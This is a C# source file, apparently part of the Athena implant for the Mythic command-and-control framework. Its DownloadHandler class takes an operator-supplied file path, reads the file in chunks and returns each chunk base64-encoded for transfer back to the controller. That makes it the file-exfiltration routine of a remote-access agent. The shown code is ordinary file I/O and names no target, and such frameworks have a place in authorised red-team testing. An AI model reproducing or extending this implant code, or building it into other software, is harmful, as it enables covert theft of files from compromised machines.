using Athena.Models.Mythic.Tasks;
using Athena.Utilities;
using System;
using System.Collections.Concurrent;
using System.Collections.Generic;
using System.IO;
using System.Threading.Tasks;
using Newtonsoft.Json;
using Athena.Plugins;

namespace Athena.Commands
{
    public class DownloadHandler
    {
        private ConcurrentDictionary<string, MythicDownloadJob> downloadJobs { get; set; }
        public DownloadHandler()
        {
            downloadJobs = new ConcurrentDictionary<string, MythicDownloadJob>();
        }
        /// <summary>
        /// Create and start a new download job
        /// </summary>
        /// <param name="job">MythicJob containing the job task</param>
        public async Task<DownloadResponse> StartDownloadJob(MythicJob job)
        {
            MythicDownloadJob downloadJob = new MythicDownloadJob(job);
            Dictionary<string, string> par = JsonConvert.DeserializeObject<Dictionary<string, string>>(job.task.parameters);
            downloadJob.path = par["File"].Replace("\"", String.Empty);
            downloadJob.total_chunks = await this.GetTotalChunks(downloadJob);
            this.downloadJobs.GetOrAdd(job.task.id, downloadJob);

            if (downloadJob.total_chunks == 0)
            {
                this.downloadJobs.Remove(job.task.id, out _);

                return new DownloadResponse
                {
                    status = "error",
                    user_output = "An error occurred while attempting to access the file.",
                    completed = "true",
                    task_id = job.task.id
                };
            }
            return new DownloadResponse
            {
                user_output = String.Empty,
                task_id = job.task.id,
                total_chunks = downloadJob.total_chunks,
                full_path = downloadJob.path,
                completed = String.Empty,
                status = String.Empty,
                chunk_num = 0,
                chunk_data = String.Empty,
                file_id = String.Empty
            };
        }
        /// <summary>
        /// Check to see if a download job has started
        /// </summary>
        /// <param name="task_id">ID of the download job</param>
        public async Task<bool> ContainsJob(string task_id)
        {
            return downloadJobs.ContainsKey(task_id);
        }
        /// <summary>
        /// Get a download job by ID
        /// </summary>
        /// <param name="task_id">ID of the download job</param>
        public async Task<MythicDownloadJob> GetDownloadJob(string task_id)
        {
            return this.downloadJobs[task_id];
        }
        /// <summary>
        /// Read the next chunk from the file
        /// </summary>
        /// <param name="job">Download job that's being tracked</param>
        public async Task<string> DownloadNextChunk(MythicDownloadJob job)
        {
            try
            {
                FileStream fileStream = new FileStream(job.path, FileMode.Open, FileAccess.Read);
                if (job.total_chunks == 1)
                {
                    job.complete = true;
                    return await Misc.Base64Encode(File.ReadAllBytes(job.path));
                }
                else
                {
                    byte[] buffer = new byte[job.chunk_size];
                    long totalBytesRead = job.chunk_size * (job.chunk_num - 1);

                    using (fileStream)
                    {
                        FileInfo fileInfo = new FileInfo(job.path);

                        if (fileInfo.Length - totalBytesRead < job.chunk_size)
                        {
                            buffer = new byte[fileInfo.Length - job.bytesRead];
                            fileStream.Seek(job.bytesRead, SeekOrigin.Begin);
                            job.bytesRead += fileStream.Read(buffer, 0, (int)(fileInfo.Length - job.bytesRead));
                            job.complete = true;
                            return await Misc.Base64Encode(buffer);
                        }
                        else
                        {
                            fileStream.Seek(job.bytesRead, SeekOrigin.Begin);
                            job.bytesRead += fileStream.Read(buffer, 0, job.chunk_size);
                            return await Misc.Base64Encode(buffer);
                        }
                    }
                }
            }
            catch (Exception e)
            {
                job.complete = true;
                return e.Message;
            }
        }

        /// <summary>
        /// Return the number of chunks required to download the file
        /// </summary>
        /// <param name="job">Download job that's being tracked</param>
        private async Task<int> GetTotalChunks(MythicDownloadJob job)
        {
            try
            {
                var fi = new FileInfo(job.path);
                int total_chunks = (int)(fi.Length + job.chunk_size - 1) / job.chunk_size;
                return total_chunks;
            }
            catch
            {
                return 0;
            }
        }
        /// <summary>
        /// Complete and remove the download job from our tracker
        /// </summary>
        /// <param name="task_id">The task ID of the download job to complete</param>
        public async Task CompleteDownloadJob(string task_id)
        {
            this.downloadJobs.Remove(task_id, out _);
        }
    }
}
